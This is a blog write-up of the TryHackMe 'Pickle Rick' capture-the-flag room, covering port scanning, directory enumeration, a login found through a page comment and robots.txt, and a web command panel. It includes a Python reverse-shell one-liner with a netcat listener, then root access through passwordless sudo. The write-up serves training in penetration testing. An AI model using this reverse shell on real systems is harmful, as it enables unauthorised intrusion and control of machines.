---
layout: post
current: post
cover: 'assets/images/picklerick/cover.png'
navigation: True
title: "Pickle Rick Write Up"
date: 2021-01-06 00:00:00
tags: [tryhackme, ctf, easy]
class: post-template
subclass: 'post'
author: darryn
---
![picklerick](/assets/images/picklerick/cover.png)

### Overview

[Pickle Rick](https://tryhackme.com/room/picklerick) is a easy room on [TryHackMe](https://tryhackme.com). I enjoyed this room a lot, it was simple and requires good enumeration. The goal of this room is to:

> This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.

### Nmap

I deployed the machine and was given the target IP 10.10.116.216. I started a NMAP scan to check the available ports. 

```highlight
└──╼ $sudo nmap -sC -sV -oN initial 10.10.116.216
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-06 21:57 GMT
Nmap scan report for 10.10.116.216
Host is up (0.026s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:4f:2b:62:18:c3:dd:2e:a2:2c:b5:12:24:12:d0:79 (RSA)
|   256 de:3b:e3:78:a0:61:ac:71:ee:75:a2:c7:ae:1b:26:40 (ECDSA)
|_  256 e4:b9:4e:ae:81:bf:32:9d:a6:22:c1:35:d4:92:bb:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.89 seconds
```

2 Ports open:

- 22 - SSH - Banner is showing its an Ubuntu machine
- 80 - HTTP - Apache web server version 2.4.18

I also ran a full port scan but no additional ports were found.

### Enumeration

I started off by looking at the web server, going to http://10.10.116.216 presents the following page:

![webpage](/assets/images/picklerick/webpage.png)

Nothing of great interest so I looked at the source.

```highlight
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Rick is sup4r cool</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="assets/bootstrap.min.css">
  <script src="assets/jquery.min.js"></script>
  <script src="assets/bootstrap.min.js"></script>
  <style>
  .jumbotron {
    background-image: url("assets/rickandmorty.jpeg");
    background-size: cover;
    height: 340px;
  }
  </style>
</head>
<body>

  <div class="container">
    <div class="jumbotron"></div>
    <h1>Help Morty!</h1></br>
    <p>Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!</p></br>
    <p>I need you to <b>*BURRRP*</b>....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is,
    I have no idea what the <b>*BURRRRRRRRP*</b>, password was! Help Morty, Help!</p></br>
  </div>

  <!--

    Note to self, remember username!

    Username: R1c<REDACTED>

  -->

</body>
</html>
```

I will take a note of the username as will probably be required later on, nothing else seems to jump out at the moment on an initial glance. Although 'Burp' got me thinking maybe I need to send the request via burp suite and play with the request but if I get stuck I will come back to that. I did some basic web enumeration first by trying common things such as checking robots.txt.

Robots.txt had a single word:

> Wubbalu   << I have redacted part the output

I could see from the source code a assets folder to I had a look at http://10.10.116.216/assets

![assets](/assets/images/picklerick/assets.png)

Nothing else jumped out so I ran a gobuster. 

```highlight
└──╼ $gobuster dir -u http://10.10.116.216 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.116.216
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/06 21:58:27 Starting gobuster
===============================================================
/assets (Status: 301)
/server-status (Status: 403)
===============================================================
2021/01/06 22:00:07 Finished
===============================================================
```

Nothing was found that I didn't already know, so I ran a second gobuster however this time I included some common extensions.

```highlight
└──╼ $gobuster dir -u http://10.10.116.216 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x html,php,log,txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.116.216
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php,log,txt
[+] Timeout:        10s
===============================================================
2021/01/06 22:00:46 Starting gobuster
===============================================================
/login.php (Status: 200)
/assets (Status: 301)
/portal.php (Status: 302)
/index.html (Status: 200)
/robots.txt (Status: 200)
/denied.php (Status: 302)
/server-status (Status: 403)
/clue.txt (Status: 200)
===============================================================
2021/01/06 22:16:54 Finished
===============================================================
```

login.php and clue.txt look interesting, going to http://10.10.116.216/clue.txt provides:

> Look around the file system for the other ingredient.

Not really much of a clue so I looked at login.php

![login](/assets/images/picklerick/login.png)

After trying some common default credentials I was able to log in with the username found in the source code and the word found in robots.txt.

![command](/assets/images/picklerick/command.png)

All the links expect 'Commands' directs to http://10.10.116.216/denied.php so I tried some basic command such as ls, id, pwd, whoami and they all work.

![ls](/assets/images/picklerick/ls.png)

However when I try and cat Sup3rS3cretPickl3Ingred.txt I get an error.

![commanddisabled](/assets/images/picklerick/commanddisabled.png)

Fortunately I can just web browse directly to the file http://10.10.116.216/Sup3rS3cretPickl3Ingred.txt, 1 down 2 to go.

### Initial Access

I want to get a shell on the box, so I checked for python or python3. 

![python3](/assets/images/picklerick/python3.png)

Great I can use python3 to get a reverse shell assuming the commands not blocked. Using the following command I get a shell!

/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<REDACTED>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```highlight
└──╼ $nc -nvlp 4444
listening on [any] 4444 ...
connect to [<REDACTED>] from (UNKNOWN) [10.10.116.216] 37984
/bin/sh: 0: can't access tty; job control turned off
$ 
```

### Priv Esc

Although I need to search for the other 2 ingredients. I wanted to escalate my privilages, I checked 'sudo -l' and I can run any sudo command with out a password so I do a simple 'sudo su' to become root.

```highlight
$ sudo -l
Matching Defaults entries for www-data on
    ip-10-10-116-216.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on
        ip-10-10-116-216.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
$ sudo su
id
uid=0(root) gid=0(root) groups=0(root)
```

Now its just a case of finding the ingredient files which can be found in /home/rick and /root. 

Thats the box, thanks for reading!
